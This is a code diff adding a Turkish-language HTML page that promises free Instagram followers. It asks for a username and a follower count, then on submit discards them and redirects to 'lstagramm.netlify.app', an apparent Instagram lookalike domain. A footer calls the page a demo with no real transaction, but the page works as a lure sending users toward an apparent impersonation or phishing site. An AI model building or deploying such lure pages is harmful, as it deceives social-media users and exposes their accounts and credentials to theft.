@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Takipçi Gönder</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(255,255,255,0.2);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+    }
+
+    button {
+      background: #fff;
+      color: #dc2743;
+      font-weight: bold;
+      border: none;
+      padding: 12px;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #fce4ec;
+    }
+
+    .logo {
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .small {
+      font-size: 12px;
+      margin-top: 10px;
+      color: #eee;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram Takipçi Gönder</div>
+    <form onsubmit="window.location.href='https://lstagramm.netlify.app'; return false;">
+      <input type="text" placeholder="Instagram kullanıcı adını gir" required>
+      <input type="number" placeholder="Takipçi Sayısı (max 1000)" required max="1000">
+      <button type="submit">Takipçi Gönder</button>
+    </form>
+    <div class="small">⚠️ Gerçek işlem yapılmaz. Sadece demo amaçlıdır.</div>
+  </div>
+</body>
+</html>
